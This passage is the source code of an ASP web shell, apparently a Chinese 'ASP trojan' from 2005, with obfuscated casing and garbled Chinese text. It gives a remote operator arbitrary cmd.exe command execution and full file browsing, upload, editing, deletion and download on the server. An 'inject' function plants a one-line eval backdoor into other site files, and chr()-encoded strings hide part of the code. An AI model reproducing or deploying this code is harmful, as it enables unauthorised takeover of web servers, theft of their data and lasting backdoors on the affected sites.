REspOnsE.writE "<a hrEF='"&url&"?path="&thing.DrivELEttEr&":&attrib=truE'>"&thing.DrivELEttEr&"ÅÌ:</a> "
NEXT
%>&nbsp;±¾»ú¾ÖÓòÍøµØÖ·£º
<%= "\\" & OScriptNEtlhn.COmputErNamE & "\" & OScriptNEtlhn.UsErNamE %></tD>
</TR>  <TD cOlspan="4" bgcOlOr="#EEEEEE" ><%
iF REquEst("attrib")="truE"  thEn
rEspOnsE.writE "<a hrEF='"&url&"'><FOnt cOlOr='#D00000'>µã»÷ÇÐ»»µ½Ïà¶ÔÂ·¾¶±à¼Ä£Ê½</FOnt></a>"
ElsE
rEspOnsE.writE "<a hrEF='"&url&"?attrib=truE'><FOnt cOlOr='#D00000'>µã»÷ÇÐ»»µ½¾ø¶ÔÂ·¾¶±à¼Ä£Ê½</FOnt></a>"
EnD iF
%>&nbspÂ·¾¶: <%=cpath%>  &nbsp;&nbsp;µ±Ç°ä¯ÀÀÄ¿Â¼:<%=lpath%>
</TD></TR> <TR>
<TD hEight=22 cOlspan="4" bgcOlOr="#EEEEEE" >
<FOrm namE="FOrm1" mEthOD="pOst" actiOn="<%=url%>" >
ä¯ÀÀÄ¿Â¼: <input typE="tExt" namE="path" sizE="30" valuE="c:">
<input typE="hiDDEn" namE="attrib" valuE="truE">
<input typE="submit" namE="Submit" valuE="ä¯ÀÀÄ¿Â¼" > ¡¼ÇëÓÃ¾ø¶ÔÂ·¾¶¡½
&nbsp&nbsp&nbsp<input typE="submit" namE="Submit1" valuE="·µ»ØÃâFsOÒ³Ãæ">
</TD></FOrm>
<%
iF rEquEst.FOrm("submit1")="·µ»ØÃâFsOÒ³Ãæ" thEn
call Out()
EnD iF%>
</TR>
<TR bgcOlOr="#EEEEEE">
<TD cOlspan="4" >
<%
DSnXA = REquEst.FOrm(".CMD")
IF (DSnXA <> "") ThEn
szTEmpFilE = "c:\" & ObjFsOlhn.GEtTEmpNamE( )
Call OScriptlhn.Run ("cmD.ExE /c " & DSnXA & " > " & szTEmpFilE, 0, TruE)
SEt OFilElcx = ObjFsOlhn.OpEnTExtFilE (szTEmpFilE, 1, FalsE, 0)
EnD IF%>
<FORM actiOn="<%= REquEst.SErvErVariablEs("URL") %>" mEthOD="POST" namE=usErData>
<input typE=tExt namE=".CMD" sizE=83 valuE="<%= DSnXA %>">
<input typE=submit valuE="cmDÃüÁî"></tD></FOrm></Tr>
<TR bgcOlOr="#EEEEEE">
<TD cOlspan="4" >
<FOrm namE="FOrm11" mEthOD="pOst" actiOn=<%=FilEnamE%>?up=yEs EnctypE="multipart/FOrm-Data">
ÒÑÓÐÎïÀíÄ¿Â¼+ÎÄ¼þÃû:
<input namE="FilEpath" valuE="D:\tEst.asp" sizE="22">
ÎÄ¼þµØÖ·:
<input namE="FilE1" typE="FilE"  sizE="20">
<input typE="submit" namE="Submit" valuE=" ÉÏ´«"> </tD>
 </FOrm></tr>
<TR bgcOlOr="#EEEEEE">
<TD cOlspan="4" >
<FOrm actiOn="<%= REquEst.SErvErVariablEs("URL") %>" mEthOD="pOst">
¹Ø¼ü×ÖËÑË÷£º <input typE="tExt" sizE="30" namE="SEarchString" valuE="<%=SEarchString%>"> <input typE="tExt" sizE="15" namE="path88" valuE=ÎïÀíÂ·¾¶µÄÄ¿Â¼><input
typE="submit" valuE="¿ÉÓÃÓÚ¼ìË÷´æÔÚµÄaspÄ¾Âí"></tD>
</FOrm></tr>
<TR bgCOlOr=#EEEEEE>
<TD hEight=22 cOlspan="4" ><FOrm namE="nEwFilE"
OnSubmit="rEturn crFilE(nEwFilE.FilEnamE.valuE);">
<input typE="tExt" namE="FilEnamE" sizE="40">
<input typE="submit" valuE="ÐÂ½¨ÎÄ¼þ" >
<input typE="buttOn" valuE="ÐÂ½¨Ä¿Â¼"Onclick="crDir(nEwFilE.FilEnamE.valuE)">¡¼ÐÂ½¨ÎÄ¼þºÍÐÂ½¨Ä¿Â¼²»ÄÜÍ¬Ãû¡½
</TD></FOrm>
<prE>
<%
IF (IsObjEct(OFilElcx)) ThEn
REspOnsE.WritE SErvEr.HTMLEncODE(OFilElcx.REaDAll)
OFilElcx.ClOsE
Call ObjFsOlhn.DElEtEFilE(szTEmpFilE, TruE)
EnD IF %>
<%
SEt FD = ObjFsOlhn.GEtFOlDEr(REquEst("path88")&"\")
IF SEarchString <> "" ThEn
REspOnsE.WritE "<H2>ÈçÏÂ½Å±¾ÎÄ¼þÄÚÇ¶ÈëËÑË÷µÄ<FOnt cOlOr=rED>" & SEarchString & "</FOnt>¹Ø¼ü×Ö£º</H2><P>"
SEarchFOlDEr FD,SEarchString
EnD IF
%>
</TR>
<TR>
<TD hEight=22 wiDth="26%" rOwspan="2" valign="tOp" bgCOlOr=#EEEEEE >
<%
Dim thEFOlDEr,thESubFOlDErs
iF ObjFsOlhn.FOlDErExists(cpath)thEn
SEt thEFOlDEr=ObjFsOlhn.GEtFOlDEr(cpath)
SEt thESubFOlDErs=thEFOlDEr.SubFOlDErs
REspOnsE.writE"<a hrEF='"&url&"?path="&REquEst("OlDpath")&"&attrib="&attrib&"'><FOnt cOlOr='#FF8000'>¡ö</FOnt>¡ü<FOnt cOlOr='FF2222'>»ØÉÏ¼¶Ä¿Â¼</FOnt></a><br>"
FOr Each x In thESubFOlDErs%>
<%REspOnsE.writE"<a hrEF='"&url&"?path="&lpath&x.NamE&"&OlDpath="&REquEst("path")&"&attrib="&attrib&"'>©¸<FOnt cOlOr='#FF8000'>¡ö</FOnt>  "&x.NamE&"</a> <a hrEF="&chr(34)&"javascript: rmDir('"&lpath&x.NamE&"')"&chr(34)&"><FOnt cOlOr='#FF8000' >¡Á</FOnt>É¾³ý</a><br>"
NExt
EnD iF
%>
</TD>
<TD  wiDth="45%"  bgCOlOr=#EEEEEE>ÎÄ¼þÃû £¨Êó±êÒÆµ½ÎÄ¼þÃû¿ÉÒÔ²é¿´¸øÎÄ¼þµÄÊôÐÔ£©</TD>
<TD wiDth="11%" bgCOlOr=#EEEEEE>´óÐ¡£¨×Ö½Ú£©</TD>
<TD wiDth="18%" bgCOlOr=#EEEEEE>ÎÄ¼þ²Ù×÷</TD>
</TR>
<TR>
<TD hEight=200 cOlspan="3" valign="tOp" bgCOlOr=#EEEEEE>
<%
Dim thEFilEs
iF ObjFsOlhn.FOlDErExists(cpath)thEn
SEt thEFOlDEr=ObjFsOlhn.GEtFOlDEr(cpath)
SEt thEFilEs=thEFOlDEr.FilEs
REspOnsE.writE"<tablE  wiDth='100%' bOrDEr='0' cEllspacing='0' cEllpaDDing='2'>"
FOr Each x In thEFilEs
iF REquEst("attrib")="truE" thEn
shOwstring="<strOng>"&x.NamE&"</strOng>"
ElsE
shOwstring="<a hrEF='"&lpath&x.NamE&"' titlE='"&"ÀàÐÍ"&x.typE&chr(10)&"ÊôÐÔ"&x.AttributEs&chr(10)&"Ê±¼ä£º"&x.DatELastMODiFiED&"'targEt='_blank'><strOng>"&x.NamE&"</strOng></a>"
EnD iF
REspOnsE.writE"<tr><tD wiDth='50%'  stylE='bOrDEr-bOttOm:1 sOliD #000000;'><FOnt cOlOr='#FF8000'>¡õ</FOnt>"&shOwstring&"</tD><tD wiDth='8%'  stylE='bOrDEr-bOttOm:1 sOliD #000000;'>"&x.sizE&"</a></tD><tD wiDth='20%'  stylE='bOrDEr-bOttOm:1 sOliD #000000;'><a hrEF='"&url&"?iD=EDit&path="&lpath&x.NamE&"&attrib="&attrib&"' targEt='_blank' >&nbsp;EDit</a><a hrEF="&chr(34)&"javascript: cOpyFilE('"&lpath&x.NamE&"')"&chr(34)&"><FOnt cOlOr='#FF8000' ></FOnt>&nbsp;cOpy</a><a hrEF='"&url&"?iD=EDit&path="&lpath&x.NamE&"&Op=DEl&attrib="&attrib&"' targEt='_blank' >&nbsp;DEl</a><a hrEF='"&url&"?iD=DOwn&path="&SErvEr.URlEncODE(lpath&x.NamE)&"&attrib="&attrib&"' targEt='_blank' >&nbsp;DOwn</a><a hrEF='"&url&"?iD=injEct&path="&lpath&x.NamE&"&attrib="&attrib&"' targEt='_blank' >&nbsp;injEct</a></tD></tr>"
NExt
EnD iF
REspOnsE.writE"</tablE>"
%>
</TD>
</TR></TBODY>
</TABLE>
<% EnD sub
sub EDit()
iF rEquEst("Op")="DEl"  thEn
'**********É¾³ýÎÄ¼þ********
iF REquEst("attrib")="truE" thEn
whichFilE=REquEst("path")
ElsE
whichFilE=sErvEr.mappath(REquEst("path"))
EnD iF
SEt thisFilE = ObjFsOlhn.GEtFilE(whichFilE)
thisFilE.DElEtE TruE
REspOnsE.writE "<br><cEntEr>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û.</cEntEr>"
'**********É¾³ýÎÄ¼þ½áÊø********
ElsE
iF rEquEst("Op")="cOpy" thEn
'**********¸´ÖÆÎÄ¼þ********
iF REquEst("attrib")="truE" thEn
whichFilE=REquEst("path")
DsFilE=REquEst("Dpath")
ElsE
whichFilE=sErvEr.mappath(REquEst("path"))
DsFilE=SErvEr.MapPath(REquEst("Dpath"))
EnD iF
SEt thisFilE = ObjFsOlhn.GEtFilE(whichFilE)
thisFilE.cOpy DsFilE
REspOnsE.writE "<cEntEr><p>Ô´ÎÄ¼þ£º"+whichFilE+"</cEntEr>"
REspOnsE.writE "<cEntEr><br>Ä¿µÄÎÄ¼þ£º"+DsFilE+"</cEntEr>"
REspOnsE.writE "<cEntEr><br>¸´ÖÆ³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</p></cEntEr>"
'**********¸´ÖÆÎÄ¼þ½áÊø********
ElsE
iF rEquEst.FOrm("tExt")="" thEn
iF REquEst("crEat")<>"yEs" thEn
iF REquEst("attrib")="truE" thEn
whichFilE=REquEst("path")
ElsE
whichFilE=sErvEr.mappath(REquEst("path"))
EnD iF
SEt thisFilE = ObjFsOlhn.OpEnTExtFilE(whichFilE, 1, FalsE)
cOuntEr=0
thislinE=SErvEr.HTMLEncODE(thisFilE.rEaDall)
thisFilE.ClOsE
EnD iF
%>
<FOrm mEthOD="POST" actiOn=""&url&"?iD=EDit">
<input typE="hiDDEn" namE="attrib" valuE="<%=REquEst("attrib")%>">
<br>
<TABLE cEllSpacing=1 cEllPaDDing=3 wiDth="750" align=cEntEr
bgCOlOr=#b8b8b8 bOrDEr=0 class="nObOrDEr">
<TBODY>
<TR >
<TD
hEight=22 bgcOlOr="#EEEEEE" ><Div align="cEntEr">º£Ñô¶¥¶ËÍøASPÄ¾Âí£À2005¦Á°æÎÄ¼þ±à¼Æ÷</Div></TD>
</TR>
<TR >
<TD wiDth="100%"
hEight=22 bgcOlOr="#EEEEEE" >ÎÄ¼þÃû£º
<input typE="tExt" namE="path" sizE="45"
valuE="<%=REquEst("path")%>"rEaDOnly>
</TD></TR><TR>
<TD
hEight=22 bgcOlOr="#EEEEEE" > <Div align="cEntEr">
<tExtarEa rOws="25" namE="tExt" cOls="105"><%=thislinE%></tExtarEa>
</Div></TD></TR><TR>
<TD
hEight=22 bgcOlOr="#EEEEEE" ><Div align="cEntEr">
<input typE="submit"
valuE="Ìá½»" namE="B1">
<input typE="rEsEt" valuE="¸´Ô" namE="B2">
</Div></TD>
</TR>
</TABLE>
</FOrm>
<%ElsE
iF REquEst("attrib")="truE" thEn
whichFilE=REquEst("path")
ElsE
whichFilE=sErvEr.mappath(REquEst("path"))
EnD iF
SEt OutFilE=ObjFsOlhn.CrEatETExtFilE(whichFilE)
OutFilE.WritELinE REquEst("tExt")
OutFilE.clOsE
REspOnsE.writE "<cEntEr>ÐÞ¸Ä³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</cEntEr>"
EnD iF
EnD iF
EnD iF
EnD sub
%>
<% sub Dir()
iF rEquEst("Op")="DEl"  thEn
'***********É¾³ýÄ¿Â¼**********
iF REquEst("attrib")="truE" thEn
whichDir=REquEst("path")
ElsE
whichDir=sErvEr.mappath(REquEst("path"))
EnD iF
ObjFsOlhn.DElEtEFOlDEr whichDir,TruE
REspOnsE.writE "<cEntEr>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û£¬É¾³ýµÄÄ¿Â¼Îª:<b>"&whichDir&"</b></cEntEr>"
'**********É¾³ýÄ¿Â¼½áÊø*************
ElsE
'***********ÐÂ½¨Ä¿Â¼**********
iF rEquEst("Op")="crEat"  thEn
iF REquEst("attrib")="truE" thEn
whichDir=REquEst("path")
ElsE
whichDir=sErvEr.mappath(REquEst("path"))
EnD iF
ObjFsOlhn.CrEatEFOlDEr whichDir
REspOnsE.writE "<cEntEr>½¨Á¢³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û,½¨Á¢µÄÄ¿Â¼Îª:<b>"&whichDir&"</b></cEntEr>"
'***********ÐÂ½¨Ä¿Â¼½áÊø**********
EnD iF
EnD iF
EnD sub
'****ÏÂÔØÎÄ¼þ
FunctiOn DOwnlOaDFilE(strFilE)
iF  rEquEst("attrib")="" thEn
strFilEnamE = sErvEr.MapPath(strFilE)
EnD iF
iF  rEquEst("attrib")="truE" thEn
strFilEnamE = REquEst("path")
EnD iF
REspOnsE.BuFFEr = TruE
REspOnsE.ClEar
dim ascstr18
ascstr18=chr(20)&chr(83)&chr(69)&chr(116)&chr(32)&chr(115)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(66)&chr(46)&chr(83)&chr(116)&chr(114)&chr(69)&chr(97)&chr(109)&chr(34)&chr(41)
excute ascstr18
s.OpEn
s.TypE = 1
On ErrOr rEsumE nExt
 iF nOt ObjFsOlhn.FilEExists(strFilEnamE) thEn
  REspOnsE.WritE("<h1>ErrOr:</h1>" & strFilEnamE & " DOEs nOt Exist<p>")
  REspOnsE.EnD
 EnD iF
 SEt F = ObjFsOlhn.GEtFilE(strFilEnamE)
 intFilElEngth = F.sizE
s.LOaDFrOmFilE(strFilEnamE)
 iF Err thEn
  REspOnsE.WritE("<h1>ErrOr: </h1>" & Err.DEscriptiOn & "<p>")
  REspOnsE.EnD
 EnD iF
 REspOnsE.ADDHEaDEr "COntEnt-DispOsitiOn", "attachmEnt; FilEnamE=" & F.namE
 REspOnsE.ADDHEaDEr "COntEnt-LEngth", intFilElEngth
 REspOnsE.CharSEt = "UTF-8"
 REspOnsE.COntEntTypE = "applicatiOn/OctEt-strEam"
  REspOnsE.BinaryWritE s.REaD
 REspOnsE.Flush
 s.ClOsE
 SEt s = NOthing
 rEspOnsE.EnD
EnD FunctiOn
%>
<%'²åÈëÎÄ¼þ
sub injEct()
iF REquEst("iD")="injEct"  anD rEquEst("attrib")<>"truE"thEn
tEstFilE=SErvEr.MapPath(""&REquEst("path")&"")
sEt thisFilE=ObjFsOlhn.OpEnTExtFilE(tEstFilE,8,TruE,0)
thisFilE.WritELinE("<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>try{Eval(REquEst.FOrm('#')+'')}catch(E){}</SCRIPT>")
thisFilE.clOsE
REspOnsE.writE "succEED!ÇëÓÃ±ùºüÀË×ÓaspºóÃÅÀ´À´·ÃÎÊÄã²åÈëµÄÎÄ¼þ"&REquEst("path")&"Ä¬ÈÏÃÜÂëÊÇ#"
ElsE
REspOnsE.writE "<FOrm mEthOD='POST' actiOn='"&REquEst.SErvErVariablEs("URL")&"?iD=injEct'>"
REspOnsE.writE "<input typE='tExt' namE='path' rEaDOnly valuE='"&REquEst("path")&"'>"
REspOnsE.writE "<input namE='submit' typE='submit' valuE='ÕâÀïÄã²åÈëÊ²Ã´Ñ½£¬ËüÊÇÎïÀíÄ¿Â¼ÎÄ¼þÁË' ></FOrm>"
EnD iF
EnD sub
%>
<%FunctiOn FiElDtypE(typEiD)
sElEct casE typEiD
 casE 130 FiElDtypE = "ÎÄ±¾"
 casE 2FiElDtypE = "ÕûÐÍ"
 casE 3FiElDtypE = "³¤ÕûÐÍ"
 casE 7FiElDtypE = "ÈÕÆÚ/Ê±¼ä"
 casE 5FiElDtypE = "Ë«¾«¶ÈÐÍ"
 casE 11  FiElDtypE = "ÊÇ/·ñ"
 casE 128 FiElDtypE = "OLE ¶ÔÏó"
 casE ElsEFiElDtypE = typEiD
EnD sElEct
EnD FunctiOn
FunctiOn FillbEFOrE(str,prEFix,tOtallEn)
str=CStr(str)
iF lEn(str)<tOtallEn thEn
 FOr i=1 tO tOtallEn-lEn(str)
  str = prEFix & str
 nExt
EnD iF
FillbEFOrE = str
EnD FunctiOn
 %>
<br>
<CENTER>¾¯¸æ£º¶Ô·Ç·¨Ê¹ÓÃ´Ë³ÌÐò¿ÉÄÜ´øÀ´µÄÈÎºÎ²»Á¼ºó¹ûÔðÈÎ×Ô¸º£¡º£Ñô¶¥¶ËÍø<br></cEntEr>
<cEntEr>
  <p>´Ë°æ±¾¸ÐÐ»£ºÍø³½ÔÚÏß¡¢¹ðÁÖÀÏ±ø¡¢±ùºüÀË×Ó¡¢À¶ÆÁ¡¢Ð¡Â·¡¢wangyOng¡¢czy¡¢sun.cËù×öµÄÒ»ÇÐÅ¬Á¦¡ôLCX&ALLEN¡ô</p>
  <p><FOnt cOlOr="#0000FF">´ËÎÄ¼þÓÉ¶¯öèÉú³ÉÆ÷Éú³É£¬¸ÐÐ»Ê¹ÓÃ QQ£º178383587</FOnt></p>
</cEntEr>
</bODy>
</html>
